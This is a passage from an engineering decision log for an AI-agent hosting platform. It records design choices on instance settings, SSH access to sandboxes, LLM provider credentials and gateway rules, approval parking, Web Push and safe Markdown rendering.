Contracts C-770..C-777, C-784. | Helm seeds and the database wins, or Helm always wins with no editing (rejected in D-195(c)); a merged copy of the effective values written by the API for other services to read (two API replicas with different configurations during a rollout would overwrite each other); a separate table per section (a migration for every new setting); copying the last Helm value only when a key is first seen missing (the gateway could start before the API and run on the default) | One generic mechanism carries every section, so the per-section briefs only add keys, pages and live readers. Mirroring at start makes "removing it from Helm keeps the value" hold for every service without coordination. Sealing in the inline store avoids a bootstrap loop between Vault settings and the secrets that reach Vault. |
| D-237 | **SPEC-SETTINGS: what moves, and the chart rules that keep Helm values meaningful.** (a) **Sections** (C-770): `governance` (`governance.*`, `byo.*`), `llm`, `sign_in` (`auth.signup_mode`, `org_creation`, session lifetimes, `cli_key_ttl_days`, `oidc_providers` — D-235(b)), `email`, `secrets` (FIX-124), `agents` (`agents.*`, `hosted.*` defaults and timeouts), `approvals`, `retention` (with `attachments.*`), `skills`, `scim`, `previews` (quotas and caps), `terminal`, `limits` (`ratelimit.api.*` tuning, `gateway.allowed_private`, gateway body and header-timeout limits). The full key list is `15 §Instance settings`. (b) **Stay in Helm**: secret and key roots, everything needed before the database or shaping Kubernetes objects, runner configuration including sandbox sizes and `max_sandboxes` (D-235(a), shown read-only), `auth.instance_admins` and `auth.trusted_origins`, `previews.enabled`/`previews.domain`, `ratelimit.counters.*`, `events.*`, `telemetry.*`, `push.*` and `blobs.*` (egress NetworkPolicies and credentials), `gateway.resolve_cache_ttl_secs` (outage tolerance), the replacement list `governance.llm.known_llm_hosts` (only `known_llm_hosts_extra` moves), and every **development or test switch** (`auth.dev_idp.*`, `hosted.allow_fake_harness`, `gateway.insecure_loopback_injection`, `plugins.allow_unsigned`, `runner.dev_*`, `connector_host.test_types`, `ratelimit.api.enabled`, `email.log_links`), which are never in the registry (SEC-89). (c) **The chart renders no movable key unless the operator set it**: `values.yaml` drops `config.hosted.enabled`, `scim.ratePerMinute` defaults to unset, and a chart guard renders the defaults and fails on any key of the checked-in movable-key list (which a registry test keeps equal to the registry). (d) **Switches with Kubernetes wiring**: the chart values `terminal.enabled` and `scim.enabled` keep rendering the wiring (runner stream listener and NetworkPolicy flows; the `/scim` edge route) and now render the Helm-only keys `terminal.available` / `scim.available` (default `false`) instead of the movable `terminal.enabled` / `scim.enabled`. The movable switch defaults to the `available` value, so an install behaves as before (chart switch on = feature on), and an admin can turn it off live; turning it on while not available is 422 `setting_requires_deployment`. (e) **Lists**: whole-list keys are `governance.llm.allowed_key_scopes`, `known_llm_hosts_extra`, `governance.egress.baseline_allowlist`, `byo.default_source_cidrs`, `llm.enabled_providers`, `llm.provider_preference`, `hosted.enabled_harnesses`, `scim.allowed_email_domains`, `gateway.allowed_private`; keyed lists as D-236(b) — `llm.endpoints` is keyed by endpoint `id` (coordinator review of the batch, 2026-11-14), like OIDC providers and secret stores. (f) `byo.enabled` becomes live (the "rolling restart" of `08 §11.9` is retired); `email.smtp_password` is the dashboard counterpart of `AURORA_SMTP_PASSWORD` (the URL carries no credentials since FIX-116, so the password, not the URL, is the sealed field); `hosted.enabled_harnesses` is limited to the harnesses registered runners report. (g) **OIDC role mappings become editable** (D-235(b) supersedes P4-IDP-1's "never editable in the dashboard"): a mapping to `instance_admin`, `org … owner` or a widened JIT is a loosening the preview flags, and SEC-90's re-authentication, critical audit and admin e-mail apply. Contracts C-778..C-783. | Keeping the chart's rendered defaults (every key would count as set and lock); one switch for wiring and feature (an admin could not turn the terminal off without `helm upgrade`, or could turn it on without the network path); moving `push.*`/`blobs.*` now (their NetworkPolicy and credential parts are Helm-only; the rest can follow on the owner's word) | The owner's rule is "move everything that does not need different Kubernetes configuration"; this list applies it key by key and keeps every switch that would change pods, routes or policies with the operator. |
| D-238 | **SPEC-SETTINGS: upgrade of existing installs and break-glass.** (a) **Upgrade**: migration `20261201000190` creates the empty table; the first start mirrors every key the values file sets (D-236(c)), so every such key stays locked and nothing changes behaviour. The chart changes of D-237(c)/(d) are behaviour-neutral (the dropped renderings equal the application defaults; the terminal and SCIM switches keep their effect through `available`). The release notes and a banner on Admin › Settings list the locked keys and explain that removing a key from the values file hands it to the dashboard with its current value. (b) **Break-glass**, none of which needs a working dashboard setting: `auth.instance_admins` still grants the flag at sign-in; a provider defined in Helm signs in independently of stored settings, and a write that would leave no OIDC provider at all is refused (422 `last_oidc_provider`); setting a key in Helm overrides any stored value at the next start; the CLI `aurora-api settings show \| reset \| export \| import` (C-784) works with the API's configuration and database URL from any pod with the API image, writes through the same service (validation, critical audit with source `cli`, notify, admin e-mail) and does not need the merged view to be valid. (c) **Invalid stored settings at start**: the service refuses to start naming the section, the key and the CLI command that resets it, as an invalid `aurora.toml` does today (fail closed: no service silently falls back to defaults that could loosen a floor). A row written by a newer release is read leniently (unknown keys ignored, logged) so a rollback does not lock the instance out. | Seeding the database from Helm on upgrade and unlocking everything (silent change of who owns each value); an environment switch that ignores stored settings (loosens floors with no audit trail); refusing a rollback | Operators who change nothing see nothing change; anyone locked out by a bad setting has three routes back that do not depend on the setting. |
| D-239 | **P4-SSH-1/2 (phase 5, coordinator spec batch, D-235(c)): SSH access to agent sandboxes, after OneCLI `docs/11`.** (a) **Posture**: operator opt-in `ssh.enabled` (default off, independent of `terminal.enabled`); who may connect is the **web terminal's rule** — `can_use` of the agent's workspace, hosted agents only, no freeze, no org toggle, no re-authentication (`04 §SSH access`, `can_ssh` in `aurora-db::authz`), checked at mint, session open, every channel and every 30 s heartbeat. (b) **Keys**: people register `ssh-ed25519` public keys only (canonical form, server fingerprint, ≤ 10, session-only writes, security-critical audit); FIDO `sk-` keys later. (c) **Certificates**: `POST /v1/agents/{agent}/ssh-certificate` (session or own API key) signs a `user` certificate with principal = agent id, key id naming person/key/agent/workspace, no critical options, only `permit-pty`, default TTL 15 min; minting is limited per (person, agent, hour) to 30 in **its own table** `ssh_mint_counters` (exact across replicas, never fails open; not `aurora-counters`, whose default backend counts per replica). (d) **Keys at rest**: the CA private key lives in the API only, behind a signer seam (`local` from `AURORA_SSH_CA_KEY`; KMS later), and the terminator gets only CA public keys (active + `ssh.ca.previous_public_keys`) at registration; the host key lives in the terminator only, one stable key for every replica, pinned by clients; the chart's `secrets` hook generates both as 32-byte ed25519 seeds (it has no `ssh-keygen`), OpenSSH keys are accepted too; the `aut_` anchor is chart-generated like `aul_` and kept hashed in memory (no token table). (e) **Path into the sandbox: the runner's stream listener :4108**, one single-use `auz_` grant per SSH channel and new `exec.*` W6 frames (`16 §W20`) — **not** podman/Kubernetes exec as `21` sketched. (f) **Sessions**: the "CA-signed session grant" of the sketch becomes an `ssh_sessions` row (lease 90 s, heartbeat 30 s, close exactly once by a guarded transition, stale sweep) plus per-channel grants in their own table `ssh_stream_grants` that the runner redeems at the API (which re-checks the session); terminator replicas register their host keys in `ssh_terminator_replicas` so any API replica can publish `known_hosts`. (g) **Channel surface**: `session` channels with `shell`, `exec` and `subsystem sftp` (the image gains `openssh-server` for its `sftp-server` binary only; `scp` works both ways); refused: `direct-tcpip`, `tcpip-forward`, streamlocal, agent forwarding, X11, `signal`; `env` only `LANG`/`LC_*`. (h) **Keep-awake on bytes**: a lease-current session holds the sandbox awake only while a channel carries bytes (reason `ssh`, 120 s grace, 4 h cap per boot, columns `sandboxes.ssh_active_until`/`ssh_awake_since`), unlike OneCLI's "a lease-current session holds the sandbox awake outside the background cap"; a connect on a parked sandbox is a wake demand through the terminal's `terminal_wake_at` and its shared per-agent wake budget. (i) **Username = agent id**; the CLI's `aurora ssh <agent>` mints, pins and execs `ssh`; the dashboard offers a certificate download for plain `ssh`. (j) **Hint-free, limited front door**: one failure answer after one fixed delay for every cause; pre-auth global/per-address concurrency, per-address token bucket, 20 s timeout; client addresses stored coarsened (/24, /48). `04 §SSH access`, `11 §SSH access`, `12 §SSH channels`, `16 §W20`, `05`, `03 §Planned changes`, `14`, `15 §SSH access`, `17` SEC-92..SEC-96, C-790..C-799. | (e) podman exec / `pods/exec` from the terminator; (f) a CA-signed session grant the terminator presents per channel; (h) SSH holding the sandbox awake for the whole lease, outside any cap; (c) the shared counter store; (g) port forwarding through the preview stream path; (a) an org-level switch or re-authentication | (e) exec runs with the container's environment, where `AURORA_*` boot material lives, so it would bypass the scrub the terminal applies (SEC-87, SEC-34), and it would give an internet-facing daemon `pods/exec` on every sandbox (or the podman socket) where a grant opens one channel of one sandbox for 30 s; :4108 already carries the terminal with proven PTY hygiene, limits, credits and keep-awake, works for podman, Kubernetes and out-of-cluster runners alike, and adds one ingress peer to the runner, nothing to the sandboxes namespace. (f) a single-use grant redeemed through the API gives the same guarantee (no hostile terminator can skip open, caps, revocation or audit) with one mechanism the runner already has; a signed bearer token would need its own expiry and revocation story. (h) an idle connection with client keepalives would otherwise keep a sandbox up for days; parity with the terminal's rule. (c) the mint limit must be exact and fail closed; OneCLI made the same call. (g) forwarding would bypass the preview share allow-list (SEC-82) and `-R` would give the sandbox a path to the person's network around the gateway (SEC-02); previews exist for web apps. (a) the terminal set the precedent and the owner chose it; an org switch is an open question. |
| D-260 | **P4-LLM spec batch (phase 5, coordinator, D-235(c)): wire formats, path sets, and providers as instance settings.** (a) **The gateway never translates between wire formats.** A harness reaches an endpoint only through a dialect both declare (`08 §Model selection`, `12 §Harness selection`); otherwise the key is `no_shared_dialect`. A cross-format combination (Codex to Claude on Bedrock, Claude Code to an OpenAI-only server) is served by a `litellm` endpoint, which translates under the operator's control, or not at all. Reach today (`12 §Provider reach per harness`): `claude-code` → `anthropic`, `bedrock` (`anthropic_bedrock`), `vertex` (`anthropic_vertex`), and `litellm`/`openai_compatible` declaring `anthropic_messages`; `codex` → `openai`, `azure_openai`, and `litellm`/`openai_compatible`/`bedrock` declaring `openai_responses`. An `openai_chat`-only endpoint (Vertex's OpenAI surface, many compatible servers) serves no shipped harness until one declares `openai_chat`; the dashboard says so (C-811). (b) **One meaning for `allowed_paths`: it adds paths** to the provider's inference set (absolute path or a `/*`-suffixed subtree, ≤ 32; `["/*"]` is the opt-out — the `/**` spelling in `08`/`15` was an error). Accepted for providers whose credential is only a model key (`litellm`, `openai_compatible`, `anthropic`, `openai`, `azure_openai`); **refused for `bedrock` and `vertex`** at start and on every settings write, because an IAM key or a service account must never be widened beyond inference. The "narrow" reading in `15` is withdrawn (model allow-lists narrow). (c) **`anthropic` gets its inference set** (due in phase 5 by SEC-65): `POST /v1/messages`, `POST /v1/messages/count_tokens`, `GET /v1/models[/{id}]`, plus `allowed_paths`; the live suite pins that the pinned Claude Code calls nothing else on the host. (d) **Streaming and errors**: responses pass through unbuffered and unaltered (SSE, AWS event stream); the gateway never retries an LLM request and never reads a response body to classify it: the request-log class comes from the status and, for Bedrock, the `x-amzn-ErrorType` header (a 429 is `llm_rate_limited` even when OpenAI's body says `insufficient_quota`); the adapters, which see the body, refine it into the turn codes of `12`. Mid-stream errors (an event-stream exception, an SSE `error` event) reach the adapters only. (e) **Test-only upstream overrides**: `llm.dev_upstream_overrides` (fixed provider hosts and mint endpoints → loopback mock URLs) is accepted only when every target is a loopback URL and `gateway.insecure_loopback_injection` is true, is never rendered by the chart and is not an instance setting (SEC-89 list); nothing else can point a fixed host elsewhere. (f) **Endpoints are instance settings** (SET-3, D-237): the provider-specific keys of `15` are part of the `llm.endpoints` entry shape and validated by the same functions at start and on every write; the endpoint test (C-779) probes each provider's own unauthenticated path (C-803). (g) **Usage**: the API stamps provider, endpoint and model into `turns.usage` (D-121(f)); the `by_model` aggregate arrives with the usage route (`10 §Usage and metering`, not built), not with P4-LLM. Contracts C-800..C-814; migrations `20261201000210..219` reserved and not needed (no schema change). | Translating Anthropic ↔ OpenAI bodies and streams in the gateway; refusing cross-format combinations with no LiteLLM route; `allowed_paths` narrowing for cloud providers; leaving `anthropic` unrestricted | Translation means parsing and rewriting every prompt and streamed answer (tool calls, thinking, caching and error shapes differ per provider) in the component whose rule is that it never alters an upstream body; LiteLLM already does it and is a first-class provider. One meaning per key keeps an operator from widening an IAM key while believing they narrow it. |
| D-261 | **P4-LLM: where model credentials live and how the gateway produces them** (amends D-121(g)). (a) **Every provider's credential is an LLM secret** (`kind = llm`), never an app connection: governance (permitted endpoints and scopes, `sanctioned_only`, key origin, model readiness and selection) is keyed on LLM secrets, and app connections never inject on a governed LLM host (`08 §LLM hosts`). The `aws-keys` app (FIX-123) stays the way to call S3/EC2; Bedrock does not use it, but reuses its pieces: the gateway's `aws_sigv4` finalizer and the AssumeRole shape of D-95 with the server-owned `org_external_id`. (b) **Bedrock auth modes**: `aws_assume_role` (**recommended**; value `{ access_key_id, secret_access_key, role_arn, session_duration_secs? }`: the gateway calls STS `AssumeRole` at `sts.<endpoint region>.amazonaws.com` with `ExternalId` = the org's `external_id` and `RoleSessionName = aurora-<org_id>`, and signs inference with the session credentials only; the source key signs only the STS call), `aws_sigv4` (static IAM key, D-121) and `api_key` (Bedrock API key). Partitions `aws` and `aws-us-gov` only (as D-95). (c) **Azure auth modes**: `api_key` and `azure_entra` (value `{ tenant_id, client_id, client_secret }`; client-credentials grant at `https://login.microsoftonline.com/<tenant_id>/oauth2/v2.0/token`, scope `https://cognitiveservices.azure.com/.default`, injected as `Authorization: Bearer`); with `azure_entra` an endpoint may use key origin `provider_account` (`organization_id` = the token's `tid`, `user_id` = its `appid`/`azp`). Public-cloud authority only. (d) **Vertex** stays `gcp_service_account`. Workload-identity federation, managed identities and the gateway's own cloud identity are out (every org's calls would run as the platform's identity, with no per-org account to govern). (e) **One mint service in the gateway** for the three minted modes (Google token, Entra token, STS session): keyed `(secret_id, value_version, mode, region)`, single-flight, zeroizing in-memory cache until `LLM_TOKEN_SKEW` before expiry (≤ 55 min, never past the STS expiry), `LLM_TOKEN_MINT_TIMEOUT`, a failed mint held `LLM_TOKEN_MINT_FAILURE_HOLD` so a burst causes one upstream call, at most `LLM_MINT_CACHE_MAX` entries; mint endpoints are pinned per mode (never taken from the secret or the endpoint entry); the mint dials through the destination guard; failure → **502** `credential_unavailable` `details: { kind: "llm_mint", reason }` (the 503 in `08` was an error; `06`'s table governs), nothing forwarded, nothing marked. Request builders and response parsers live in `aurora-llm`, so the API's validation runs the same code. (f) **Validation** is each mode's cheapest live proof: AssumeRole (the account id comes from the assumed-role ARN), the Entra mint, the Google mint. Contracts C-801, C-804, C-806, C-807; SEC-97. | Bedrock through an `aws-keys` connection (two governance systems for one host); refreshing temporary keys from a CLI profile; the gateway's own IAM role or GCP identity; sovereign Azure clouds now | FIX-123 made assume-role the recommended AWS method; the same for Bedrock removes long-lived IAM keys with broad scope from the store while the org keeps owning the account. Minting stays in the gateway (D-121(b)), and one service keeps cache, single-flight and failure behaviour identical for all three. |
| D-262 | **P4-LLM: endpoint destinations once endpoints are dashboard settings.** (a) **Private addresses**: an endpoint defined in the deployment configuration (source `helm`) keeps today's implicit pass through the destination guard for its exact host (an in-cluster LiteLLM keeps working on upgrade); an endpoint added in the dashboard gets **no implicit pass**: its host must be covered by `gateway.allowed_private` (itself an audited instance setting) to reach a private address. Cloud-metadata and link-local addresses are never passed implicitly (exact-IP `allowed_private` entries only, `06`). An entry handed from Helm to the dashboard (mirroring) loses the implicit pass at that start; its row is marked `needs_allowed_private` and the preview warns `endpoint_resolves_private` (C-813). (b) **Plain `http://`** is accepted for `litellm` and `openai_compatible` only: for a Helm endpoint as today (the operator's choice; injection to the exact origin, D-180), for a dashboard endpoint only when its host is loopback or covered by `gateway.allowed_private` (an explicit "this is internal"); every other provider is https only. (c) **Host ownership**: saving a dashboard endpoint whose host is matched by an active app's static claim or an app-instance registration → 422 `settings_invalid` code `endpoint_host_claimed` naming the app (the reverse, a package claiming an endpoint host, is already refused, `09`). (d) The gateway rebuilds the guard's endpoint allowance together with the endpoint table on every `llm` or `limits` reload. SEC-98. | Implicit pass for every endpoint (a dashboard entry or a typo opens an internal host to every agent); no implicit pass at all (breaks existing in-cluster LiteLLM installs on upgrade); a save-time DNS check as the only control (DNS changes later) | The implicit pass rested on "the operator configured it"; a dashboard entry gets the explicitness the instance already requires for every other private destination, and the guard still enforces it at dial time. |
| D-264 | **P4-011B spec batch (phase 5, coordinator, D-235(c)): park-and-resume reconciled with what landed since SPEC-P4b** (D-133 stands; this fills its gaps and corrects two spec errors). (a) **What parks, restated**: only the held HTTP request parks — it is refused at once and **never sent**; the turn ends normally, the sandbox idles and parks by the ordinary rules (not a keep-awake reason), and the only state is the `approvals` row (salted fingerprint, no body, no headers). The decision reaches the agent as a **new system turn** in the origin conversation, or as a steer into the origin turn if that is still running and its harness steers; no process, connection or turn is suspended and no harness gains a "suspend" capability. A *held* request, by contrast, blocks the harness's tool call on an open connection inside a live turn, bounded below the turn ceiling (RFE-011a), exactly as before. (b) **The switch governs creation only**: `approvals.park.enabled` (a live instance setting, D-265(c)) decides whether *new* approvals park; grant lookup and consumption, decisions, follow-ups, reminders and expiry keep running for existing parked rows whatever the switch says, so turning parking off never strands an approved grant (the gateway's grant lookup runs on every `needs_approval` verdict: one indexed read, slow path only). (c) **LLM traffic never parks**: a request to a governed LLM endpoint (`06` step 6a) is the harness's own model call, which no agent can repeat byte-identically and whose refusal would fail the turn; it is held and clamped as before. So `approval_parked` only ever answers an agent's own tool call, which the supervisor never sees (`12` said it showed an activity line: an error; the person sees the `approval.pending { parked: true }` event). (d) **Revocation follows FIX-084**: every event that abandons pending approvals (freeze; deleting or narrowing the grant; disabling or deleting the connection or secret; activating a snapshot under which the request would be blocked) also sets `resume_state = 'revoked'` on the matching `ready` grants in the same transaction; deleting the agent or the conversation, and anything that bumps the conversation's `harness_session_epoch` (harness switch, redaction with `reset_session`), abandon its pending parked approvals and revoke its ready grants (no conversation to resume in, or an agent that no longer holds the exact request). Each leaves a transcript notice where a transcript remains, never a turn. Consumption still re-resolves and re-evaluates (FIX-084's recheck at release). (e) **One follow-up per conversation per decision transaction**: a batch decision yields one system follow-up listing at most `PARK_FOLLOWUP_LINES_MAX` (10) approvals and "N more"; its door is `{ kind: "system", ref: "approval:<id>" }` — the `approval` door kind in `10` was an error (the door vocabulary is closed; the dashboard's "Approval" chip comes from `ref`); the follow-up row is written in the deciding transaction (a crash cannot leave a grant the agent is never told about). Doorless-turn mirroring (`13`) posts the agent's answer only, never the follow-up text. `07 §Park and resume`, `06 §Parking and grants`, `10 §Turns`, `12`, `13 §5.6`, SEC-74, C-820..C-826. | Resuming the same turn or connection (rejected in D-133); a switch that also stops grant consumption; parking LLM requests; keeping ready grants alive after access is removed (the agent would be told "approved" and then refused); one follow-up per approval of a batch | The switch is live now, so existing rows must outlive it; revoking at the event tells the agent and the approver the truth at once instead of after a futile retry, while the consumption-time recheck still guards the request itself. |
| D-265 | **P4-011B: parking's records, notifications and settings.** (a) **Request log**: the decision vocabulary gains `approval_parked` (a parked refusal and its identical repeats); a consumed grant is logged `approved` with `resumed = true`; the deny-cooldown answer is `approval_denied`; `approval_limit_reached` is `rate_limited` with that `error_code`. New columns `request_log.approval_id` (every hold, park and consumption) and `request_log.resumed` (migration `20261201000221`, which widens the decision CHECK). (b) **Reminder e-mail claims**: `approval_notifications` gains `stage` (`initial` \| `reminder`) in its primary key (migration `…000222`), so the parked reminder e-mail is its own idempotent claim (`07`'s reminder had no e-mail claim); push claims stay in `approval_push_claims`. (c) **Settings (D-237's rule)**: every `approvals.park.*` key is a **movable instance setting** in the `approvals` section (no Kubernetes wiring), read per request by the gateway and the API; no chart value renders them. `PARK_PER_AGENT_HOUR` stays a constant. Cross-key rule at start and on every write: `approvals.park.threshold_secs ≤ approvals.max_timeout_secs ≤ approvals.park.max_timeout_secs` (422 `settings_invalid` codes `park_threshold_above_hold_max` / `park_max_below_hold_max`), so every timeout the hold cannot serve is parkable rather than silently clamped. Turning parking on and raising its maxima are loosenings (preview). A rule keeps its stored timeout when parking is turned off; holds clamp it and the effective view says so (`clamped: true`). (d) A signed-in route `GET /v1/policy/approval-limits` gives the approval bounds the policy editor needs (`{ timeout_secs, max_timeout_secs, park { enabled, threshold_secs, max_timeout_secs, resume_window_secs } }`; not on the unauthenticated `/v1/instance`), and simulate/effective views say whether a request would park. Migration `20261201000220` adds the `approvals` columns of `03 §Planned changes` and the gateway role's column grants. `03`, `05`, `07`, `15 §Instance settings`, C-827..C-829. | `push`-style Helm-only park keys (they need no deployment change); a new approval `status` for parked rows (the closed vocabulary stays; `resume_state` carries the resume lifecycle); clamping silently when the threshold exceeds the hold maximum | Operators tune parking per instance from the dashboard like the other approval deadlines; the cross-key rule keeps the two maxima and the threshold from contradicting each other on any write. |
| D-266 | **P4-011B: Web Push reconciled** (D-134 stands). (a) **Stays in Helm** (D-237(b)): all of `push.*`; the chart value `push.enabled` renders `config.push.enabled` (mirrored like `relay.enabled`: both set and unequal, or the config key alone, fails the render) and the api's egress NetworkPolicy to `push.networkPolicy.egressTo`; an operator-managed VAPID private key is a secret root (`push.vapid.existingSecret`/`key` → `push.vapid.private_key_env`); Admin › Overview shows the push state read-only; nothing of push is an instance setting. (b) **Inline store**: the generated VAPID private key and every subscription's sealed `{ endpoint, p256dh, auth }` are sealed in the **`inline`** store whatever `secrets.default_store` says (amends `08`'s "the default store"): a push opens one secret per device per approval and must neither depend on nor fan out to an external store, and the material is the instance's, not an organization's (D-236(g)'s reasoning). (c) **Session binding made exact**: sign-out, "sign out other sessions", an administrator's session revocation and deactivation **delete** the session's subscriptions in the revoking transaction; idle or absolute expiry stops delivery at once (liveness is the authentication check itself) and the daily session pruning deletes them. A browser whose subscription lost its session is **re-bound silently** on the same person's next visit in that browser (`rebind: true`), which succeeds only when the endpoint is already registered **to the caller**; a different person never inherits a device without the deliberate gesture (the "moves" rule applies to gesture registrations only). (d) **Key identity by public key**: the browser reports the application-server key it subscribed with (`vapid_public_key`), not a key id, so rotation detection works the same for generated and operator-managed keys. (e) **Topic** = the first 32 base64url characters of `SHA-256(subscription id ‖ approval id)`: a push service can neither learn approval ids nor correlate one approval across a person's devices. `07 §Web Push`, `08`, `05`, `04`, `16 §W16`, `23`, SEC-75, SEC-76, C-830..C-834, C-837, C-838. | Making `push.enabled` a movable switch with a `push.available` key (deferred: D-237 keeps push in Helm until the owner says otherwise); subscriptions in the org's external store; re-binding a device to whoever signs in next | A push must work when an external store is slow and must reach only the person who opted in on that browser; the rest follows D-134 unchanged. |
| D-267 | **P4-011B: the service worker, and testing push without a push service.** (a) **Service worker**: one static file `web/public/aurora-push-sw.js` at scope `/`, registered **only** by the Turn-on gesture (never on page load for a person who has not opted in) and unregistered when the browser's registration is removed; it has **no `fetch` handler, no Cache Storage, no `importScripts`, no network call and no `clients.claim`**, so it can never serve or cache API data or pages; served with `Cache-Control: no-cache` under the dashboard CSP, which gains `worker-src 'self'` and `manifest-src 'self'`; a web test fails if the file gains any of those APIs (SEC-102). Offline caching and installable-app features beyond the iOS Home Screen manifest are out of scope. (b) **Test seam**: `push.dev_endpoint_overrides` (`{ "<allow-listed push host>": "<loopback http URL>" }`) sends to the test kit's mock push service; accepted only when every target is loopback and `server.external_url` is loopback (a development key, FIX-116), never rendered by the chart, not an instance setting (SEC-89); the allow-list and the VAPID `aud` still use the subscription's real origin, so the mock checks exactly what a push service checks (ES256 signature and claims, `aes128gcm` decryption with the test subscription's private key, `TTL`, `Urgency`, `Topic`, the payload fields). The browser leg drives the service worker with Chromium's DevTools `ServiceWorker.deliverPushMessage` (Playwright); delivery through a real push service to a real browser is a manual release check (`docs/operator`), not CI. Contracts C-835, C-836, C-839; SEC-102. | A caching or pass-through `fetch` handler (any handler is one edit away from caching API data); bypassing the destination guard by a production switch; CI against FCM/Mozilla | The worker's only job is to show a fixed-text notification and open a same-origin path; giving it nothing else is the cheapest way to guarantee it never holds data, and a loopback-only seam tests the real wire format without opening a production path. |
| D-268 | **Owner, 2026-11-14: answers to the SSH (D-239) and LLM-provider (D-260..D-262) spec questions.** SSH: (a) a session keeps the sandbox awake **only while bytes flow** (capped at 4 h, like the terminal), not merely while connected; (b) **no port forwarding** of any kind (`-L`, `-R`, agent, X11) — only shell, exec and sftp. LLM providers: (c) **Azure Entra client credentials and Bedrock assume-role are in scope now** (D-121's deferral lifted); (d) the **`anthropic` path set is on by default** (inference paths only; `allowed_paths` widens per endpoint; `15 §Upgrades` names the Files/Batches paths to add). Coordinator defaults for the remaining questions, recorded for review: SSH is an operator switch only (no org-level switch yet); ed25519 keys only (FIDO `sk-` keys later); client addresses stored coarsened (/24, /48); no PROXY protocol yet; `rsync` not added to the image; 30 s revocation accepted; sovereign Azure clouds and the gateway's own cloud identity (workload identity, IRSA) out of scope; `LLM_SIGN_BODY_MAX` 8 MiB; per-model usage waits for the usage route. | (a) awake while connected; (b) `-L` to preview-shared ports; (c) keys only first; (d) path set opt-in | Least privilege and cost: an idle SSH window does not pin a sandbox, forwarding would be a second path around previews and the gateway, assume-role/Entra avoid long-lived keys, and an LLM key reaches only inference unless an operator widens it. |
| D-269 | **Owner, 2026-11-14: answers to the P4-011B spec questions (D-264..D-267 stand as written).** (a) Parking is an **instance-wide switch only** (`approvals.park.enabled`), no org opt-out; (b) with parking on, **every** approval rule may set a timeout above the turn ceiling (up to `approvals.max_timeout_secs`); (c) `push.*` **stays in Helm** (D-237(b)); (d) Web Push is tested in CI with the **mock push service and a service-worker browser test**; real delivery through browser push services is a **manual release check** (`15`). | (a) an org governance toggle; (b) opt-in per rule; (c) a `push.available` + movable `push.enabled` split; (d) an env-gated live suite | Fewer switches and test combinations; the VAPID pair is a secret root; vendor push services cannot run in CI without browser profiles and credentials. |
| D-244 | **FIX-124 (lane `p5-apps`): instance-setting secrets never leave the inline store, including by migration.** `aurora-api secrets migrate --to <store>` and the dashboard's **Move values** job leave the `instance_setting` purpose (the sealed fields of the instance settings: OIDC client secrets, the SMTP password, a Vault store's AppRole secret id) on the inline store (`Options.keep_instance_settings_inline`); `--to inline` and `secrets rekey` still re-seal them. The migration lock is one transaction-scoped advisory lock shared by the CLI and the dashboard job (C-747). Why: D-236(g) seals them inline so that sign-in, mail and reaching Vault never depend on an external store; an AppRole secret id moved into Vault would be unreadable at the next start (the store could not authenticate to read its own credential). Changes the pre-FIX-124 CLI, which moved every purpose. `08 §2`, `15`, `operator/vault.md`. | Moving them and special-casing the AppRole secret id (the rule would be per field, and the other fields still bind sign-in and mail to the store) | A store can always be built from what the database alone holds. |
| D-245 | **FIX-137: the dashboard Markdown renderer's construction and its one deviation beyond D-227's list: Mermaid is shown as a code block.** (a) **Pipeline**: `react-markdown` + `remark-gfm` (+ `remark-breaks` for a person's text) → `remark-rehype` → `rehype-raw` → `rehype-slug` → `rehype-sanitize` (GitHub's schema plus D-227's allowlist; no author `class`/`style`) → fragment-link and alert plugins → React elements; never an HTML string. Exact versions pinned. (b) **Lazy chunks** loaded only when a message needs them: math (`remark-math`, `rehype-katex` with `trust: false`, KaTeX CSS and fonts from `self`), highlighting (`rehype-highlight`, highlight.js common languages), emoji (`remark-emoji`). They run after sanitising and only recognise the exact `language-*`/`math-*` classes the schema lets through. (c) **`$…$` follows github.com's rule** (closing `$` not preceded by a space nor followed by a digit), so "costs $5 and $10" stays text. (d) **Mermaid renders as a code block with a "mermaid" label**: Mermaid's generated SVG carries an inline `<style>` element and the dashboard CSP is `style-src 'self' 'nonce-…'` (only `style-src-attr` is loosened, D-176); allowing it needs `'unsafe-inline'` or a nonce Mermaid cannot receive, and the SVG would have to enter the DOM as HTML. D-227(b)'s fallback applies; revisit if Mermaid gains a CSP-safe mode. (e) **Heading anchors** are ids (`user-content-<slug>`, as on github.com) with `#fragment` links rewritten to match; no hover permalink icon. (f) **Known cosmetic differences** (listed in `web/tests/fixtures/markdown-expected.ts`): remark drops the first blank line of a fenced block; the CommonMark examples that exercise raw HTML outside the allowlist, non-http schemes and CommonMark-only (non-GFM) autolinks differ by design. | Hand-rolled subset (the owner: no); `markdown-it`/`marked` (string output needs `dangerouslySetInnerHTML`); loosening `style-src` for Mermaid; Mermaid via an iframe sandbox (a second origin and CSP to maintain) | Rendering through React elements keeps XSS out structurally; lazy chunks keep the main bundle small; the CSP stays as documented. |
| D-246 | **FIX-138: the web terminal runs bash by default, zsh by choice, with one `PATH`.** (a) The shell is an **enumerated** choice (`bash` \| `zsh`, never a path) carried `?shell=` on `GET /v1/agents/{agent}/terminal` → the `terminal_stream_grants.shell` column (migration `20261201000170`) → the redemption answer's `shell` → `pty.open.shell` → the supervisor, which maps it to the fixed `/bin/bash` / `/usr/bin/zsh` and starts an interactive login shell (`-l`); any other value is 422 `invalid_shell`; a missing zsh falls back to bash, a missing bash to `/bin/sh`, each with a one-line notice; the supervisor's `$SHELL` is no longer consulted. The web selector's choice is remembered per browser in `localStorage` (no preference store fits a per-agent, per-person UI choice; server-side would need a new table for one enum). (b) One `PATH` (`/workspace/.local/bin:/opt/aurora/bin:/usr/local/bin:/usr/bin:/bin`) in the image `ENV`, `/etc/profile.d/aurora.sh`, `/etc/zshenv`, the PTY spawn and the supervisor's spawn default; interactive defaults (aliases, colours, prompt, history, zsh `compinit`) only in system rc files, never in the agent's home, never in non-interactive turns. (c) The `claude`/`codex` wrappers (brief item 1b) are **not** part of this decision yet: they need the gateway base URL, model, proxy and CA the boot document holds and the terminal deliberately does not receive. | A shell path in the query or the wire (an arbitrary-exec primitive); `$SHELL` (unset in the supervisor's environment, hence dash); a server-side preference table | The grant is the single place the choice already travels with the open; an enumeration keeps the supervisor's binary choice fixed; system rc files keep the agent's data directory the agent's. |
